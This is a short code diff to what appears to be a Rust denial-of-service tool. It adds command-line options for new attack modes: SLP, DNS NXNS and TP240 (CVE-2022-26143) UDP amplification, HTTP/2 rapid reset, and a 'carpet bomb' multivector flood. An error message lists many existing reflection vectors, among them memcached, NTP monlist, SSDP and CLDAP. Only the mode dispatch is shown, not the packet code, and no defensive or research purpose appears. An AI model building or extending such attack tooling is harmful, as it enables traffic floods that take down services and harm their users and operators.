@@ -579,8 +579,11 @@ async fn main() {
             "dns-dnssec" | "dnssec" | "dnssec-query" => udp::UdpMode::DnsDnssec,
             "dns-recursive" | "dns-recursive-chain" | "recursive-dns" => udp::UdpMode::DnsRecursiveChain,
             "udp-flood" => udp::UdpMode::UdpFlood,
+            "slp" | "slp-du" | "slp-update" => udp::UdpMode::SlpDuUpdate,
+            "dns-nxns" | "dns-nxns-attack" | "nxnsattack" => udp::UdpMode::DnsNxns,
+            "tp240" | "tp240-phonehome" | "cve-2022-26143" => udp::UdpMode::Tp240PhoneHome,
             _ => {
-                eprintln!("Unknown UDP amplification mode: {}. Available: dns-any, dns-ixfr, ntp-monlist, ntp-query, memcached, memcached-get, ssdp, snmp-getbulk, chargen, qotd, generic, cldap, coap, ws-discovery, portmap, netbios, mdns, tftp, sip, ike, rip, bacnet, ntp-readvar, dnssec, dns-recursive, udp-flood", udp_mode_str);
+                eprintln!("Unknown UDP amplification mode: {}. Available: dns-any, dns-ixfr, ntp-monlist, ntp-query, memcached, memcached-get, ssdp, snmp-getbulk, chargen, qotd, generic, cldap, coap, ws-discovery, portmap, netbios, mdns, tftp, sip, ike, rip, bacnet, ntp-readvar, dnssec, dns-recursive, udp-flood, slp, dns-nxns, tp240", udp_mode_str);
                 return;
             }
         };
@@ -759,6 +762,8 @@ async fn main() {
             "requestflood" => AttackMode::RequestFlood,
             "notfound" => AttackMode::NotFound,
             "slowloris" => AttackMode::Slowloris,
+            "h2rapidreset" | "h2-rapid-reset" | "h2reset" => AttackMode::H2RapidReset,
+            "carpetbomb" | "carpet-bomb" | "multivector" => AttackMode::CarpetBomb,
             _ => AttackMode::Normal,
         };
 
